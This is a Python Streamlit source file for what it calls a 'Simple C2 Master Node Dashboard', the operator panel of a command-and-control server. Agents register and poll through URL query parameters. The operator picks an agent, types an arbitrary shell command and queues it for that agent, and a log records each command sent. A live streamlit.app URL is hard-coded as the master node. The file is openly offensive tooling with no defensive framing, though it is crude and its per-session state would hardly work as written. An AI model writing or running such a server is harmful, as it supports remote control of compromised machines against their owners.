import streamlit as st
import socket
import time

# Set up the Streamlit page
st.set_page_config(layout="wide", page_title="Simple C2 Master Node Dashboard")

# Function to get the actual IP address of the machine
def get_actual_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = "127.0.0.1"
    finally:
        s.close()
    return ip_address

# Initialize the session state for logs and agents
if 'logs' not in st.session_state:
    st.session_state['logs'] = "[INFO] Starting Simple C2 Server..."
if 'agents' not in st.session_state:
    st.session_state['agents'] = {}

# Sidebar to show the master node information
master_url = "https://m-dashboardpy-app9jfrumktgxrf359vu6t6.streamlit.app/"  # Replace with your Streamlit app URL
master_ip = get_actual_ip()
st.sidebar.title("Simple Command & Control (C2) Dashboard")
st.sidebar.write("Master Node URL:")
st.sidebar.write(master_url)
st.sidebar.write("Master Node IP Address:")
st.sidebar.write(master_ip)

# Columns for displaying agents and commands
col1, col2 = st.columns([1, 2])

# Column 1 - Connected Agents
with col1:
    st.subheader("Connected Agents")
    if st.session_state['agents']:
        for agent_id in st.session_state['agents']:
            st.write(f"Agent: {agent_id} - Last Seen: {st.session_state['agents'][agent_id]['last_seen']}")
    else:
        st.write("No agents connected.")

# Column 2 - Command Execution
with col2:
    st.subheader("Command Execution")
    if st.session_state['agents']:
        selected_agent = st.selectbox("Select Agent", options=list(st.session_state['agents'].keys()))
        command = st.text_input("Enter Command to Execute")
        if st.button("Send Command"):
            # Store the command for the selected agent
            st.session_state['agents'][selected_agent]['command'] = command
            st.session_state['logs'] += f"\n[+] Command sent to {selected_agent}: {command}"

# Display Logs
st.subheader("Logs")
st.text_area("Logs", st.session_state['logs'], height=300)

# Agent Registration and Command Fetching via URL parameters
params = st.experimental_get_query_params()
if "agent_id" in params:
    agent_id = params["agent_id"][0]

    # Register the agent if not already in session state
    if agent_id not in st.session_state['agents']:
        st.session_state['agents'][agent_id] = {"last_seen": time.ctime(), "command": ""}
        st.session_state['logs'] += f"\n[+] Agent {agent_id} registered"

    # Update the last seen timestamp
    st.session_state['agents'][agent_id]['last_seen'] = time.ctime()

    # Send back command if available
    command_to_execute = st.session_state['agents'][agent_id]['command']
    if command_to_execute:
        st.write(f"Command for {agent_id}: {command_to_execute}")
        # Clear the command after execution
        st.session_state['agents'][agent_id]['command'] = ""
    else:
        st.write(f"No commands for {agent_id}")
